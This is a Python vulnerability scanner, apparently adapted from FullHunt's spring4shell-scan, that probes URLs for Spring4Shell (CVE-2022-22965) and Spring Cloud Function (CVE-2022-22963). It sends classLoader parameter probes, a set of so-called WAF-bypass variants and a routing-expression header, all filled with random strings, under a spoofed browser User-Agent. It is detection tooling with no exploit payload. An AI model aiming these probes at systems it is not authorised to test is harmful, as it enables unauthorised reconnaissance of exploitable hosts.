#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# spring4shell-scan: A generic scanner for Spring4Shell CVE-2022-22965 and CVE-2022-22963
# Author:
# Mazin Ahmed <mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************


import argparse
import random
import requests
import sys
from urllib import parse as urlparse
from ClassCongregation import color

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

a = '''
class[{{random}}]={{random}}
class.module[{{random}}]={{random}}
class.module.classLoader[{{random}}]={{random}}
class.module.classLoader.URLs[{{random}}]={{random}}
class.module.classLoader.resources[{{random}}]={{random}}
class.module.classLoader.resources.context[{{random}}]={{random}}
class.module.classLoader.resources.context.parent[{{random}}]={{random}}
class.module.classLoader.resources.context.parent.pipeline[{{random}}]={{random}}
class.module.classLoader.resources.context.parent.pipeline.first.pattern[{{random}}]={{random}}
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat={{random}}
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat[{{random}}]={{random}}
'''



color('[•] CVE-2022-22965 - Spring4Shell RCE Scanner', "green")

default_headers = {
    #'User-Agent': 'spring4shell-scan (https://github.com/fullhunt/spring4shell-scan)',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Accept': '*/*'
}

timeout = 4

def get_random_string(length=7):
    return ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(length))

def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def set_url_path(url, path="/"):
    url_parsed = parse_url(url)
    return f'{url_parsed["site"]}{path}'


def get_waf_bypass_payloads():
    random_string = get_random_string()
    payloads = []
    for payload in a.strip('\n').split('\n'):
            payload = payload.replace("{{random}}", random_string)
            payloads.append(payload.strip())
    #print(payloads)
    return payloads


def verify_base_request(url, method):
    r = requests.request(url=url,
                         method=method,
                         headers=default_headers,
                         verify=False,
                         timeout=timeout,
                         )
    return r.status_code


def test_url_cve_2022_22965(url):
    main_payload = "class.module.classLoader[{{random}}]={{random}}"
    main_payload = main_payload.replace("{{random}}", get_random_string())
    payloads = []
    payloads.append(main_payload)
    #if args.waf_bypass_payloads:
    payloads.extend(get_waf_bypass_payloads())

    for payload in payloads:
        parameter, value = payload.split("=")
        color(f"[•] URL: {url} | PAYLOAD: {payload}", "black")

        if 'ALL' in ("POST", "ALL"):
            try:
                r = requests.request(url=url,
                                     method="POST",
                                     headers=default_headers,
                                     verify=False,
                                     timeout=timeout,
                                     data={parameter: value},
                                     )
                if r.status_code not in (200, 404) and verify_base_request(url, "POST") != r.status_code:
                    return True
            except Exception as e:
                color(f"EXCEPTION: {e}")
        if 'ALL' in ("GET", "ALL"):
            try:
                r = requests.request(url=url,
                                     method="GET",
                                     headers=default_headers,
                                     verify=False,
                                     timeout=timeout,
                                     params={parameter: value},
                                     )
                if r.status_code not in (200, 404) and verify_base_request(url, "GET") != r.status_code:
                    return True
            except Exception as e:
                color(f"EXCEPTION: {e}")
    return False


def test_cve_2022_22963(url):
    random_string = get_random_string()
    headers = {}
    headers.update(default_headers)
    url = set_url_path(url, path="/functionRouter")
    #color(f"[•] URL: {url}", "cyan")

    headers.update({"spring.cloud.function.routing-expression": random_string})
    try:
        r = requests.request(url=url,
                             method="POST",
                             verify=False,
                             timeout=timeout,
                             data=random_string,
                             headers=headers,
                             )
        if r.status_code not in (200, 404) and verify_base_request(url, "POST") != r.status_code:
            return True
    except Exception as e:
        color(f"EXCEPTION: {e}")

    return False

def check(**kwargs):
    color(f"[•] URL: {kwargs['url']}", "magenta")
    color("[%] Checking for Spring4Shell RCE CVE-2022-22965.", "magenta")
    result1 = test_url_cve_2022_22965(kwargs['url'])
    if result1:
        color("[!!!] Target Affected (CVE-2022-22965)", "red")
    else:
        color("[•] Target does not seem to be vulnerable for CVE-2022-22965", "green")
    
    color("[%] Checking for Spring Cloud RCE CVE-2022-22963.", "magenta")
    result2 = test_cve_2022_22963(kwargs['url'])
    if result2:
        color("[!!!] Target Affected (CVE-2022-22963)", "red")
    else:
        color("[•] Target does not seem to be vulnerable for CVE-2022-22963", "green")
    if result1 and result2:
        return 'CVE-2022-22965 True, CVE-2022-22963 True'
    elif result1:
        return 'CVE-2022-22965 True'
    elif result2:
        return 'CVE-2022-22963 True'
    else:
        return 'Fail'




